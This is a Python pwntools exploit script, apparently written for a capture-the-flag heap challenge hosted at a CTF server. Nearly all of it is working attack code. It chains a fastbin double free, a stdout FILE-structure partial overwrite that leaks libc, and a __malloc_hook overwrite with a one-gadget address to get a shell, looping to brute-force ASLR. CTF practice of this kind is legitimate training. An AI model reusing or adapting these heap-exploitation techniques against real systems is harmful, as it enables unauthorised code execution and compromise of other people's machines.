from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep

context.arch = "amd64"
context.word_size = 64

file = "./mcback2dabasics_patched"
args = []
io: process = None

speed = 0.1

def debug():
    gdb.attach(io, gdbscript=
    """
    define fix
    patc b 0x7ffff7bc1b09 0x50
    end
    define allocs
    p *(char*[64]*)0x0000555555602060
    end
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote(host="challs.tfcctf.com", port=30518)

def launch_local():
    global file, io
    io = process([file, *args])
    # debug()

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)

def launch():
    l = launch_local
    # l = launch_remote
    with context.local(log_level=logging.ERROR):
        l()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1: a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1: b_ = 0
    return d[a_+len(a):b_]

#
# exploit goes here
#

exe = ELF(file)
libc = ELF("./libc.so.6")
# libddd = ELF("./libddd.so")

def exploit():
    def malloc(size, data=b"\n"):
        sla(b"[+]> ", b"1")
        sla(b"[+]> ", str(size).encode())
        if size == 0:
            return
        sa(b"Data?\n", data)
        sleep(speed)
    def free(index):
        sla(b"[+]> ", b"2")
        sla(b"[+]> ", str(index).encode())
    def quit():
        sla(b"[+]> ", b"3")

    malloc(0) # index = 0
    malloc(9, p64(0) + p8(0x21)) # index = 1
    malloc(0) # index = 2
    malloc(0x67) # index = 3
    payload = flat({
        0x10: [
            0,
            (0x70-0x10) | 1,
        ]
    }) + b"\n"
    malloc(0x70, payload) # index = 4

    free(3)

    free(0)
    free(1)
    free(0)

    malloc(8, p8(0x20 + 0x10)) # index = 5
    malloc(0) # index = 6
    malloc(0) # index = 7

    payload = flat([
        0,
        0x91, # size for unsorted + prev in use
    ])

    malloc(0x10, payload) # index = 8
    
    free(2)
    malloc(0) # index = 9
    

    guess = randint(0x1, 0xf)
    # guess = 2
    info("guess: %#x", guess)
    malloc(0x57, p16(guess << 12 | (0x5c5 - 8))) # index = 10

    malloc(0x67) # index = 11


    payload = flat([
        b"A"*3,
        b"A"*8*6,

        0xfbad3887,
        0, # read ptr
        0, # read end
        0, # read base
    ]) + b"\0" # write_base partial overwrite
    malloc(0x67, payload) # index = 12

    leak = recvu(b"Job done!")
    libc.address = u64(leak[0x28:0x30]) - 0x3c2683
    info("libc: %#018x" % libc.address)

    malloc(0x67) # index = 13
    malloc(0x67) # index = 14

    free(13)
    free(14)
    free(13)

    malloc(0x67, p64(libc.sym["__malloc_hook"] - 0x23))
    malloc(0x67)
    malloc(0x67)

    payload = flat([
        b"A"*3,
        b"A"*8*2,
        libc.address + 0xce0e9,
    ])
    malloc(0x67, payload)

    malloc(0)

    io.interactive()
    input("end")
    exit()


while True:
    launch()
    try:
        exploit()
    except EOFError:
        pass
    io.close()
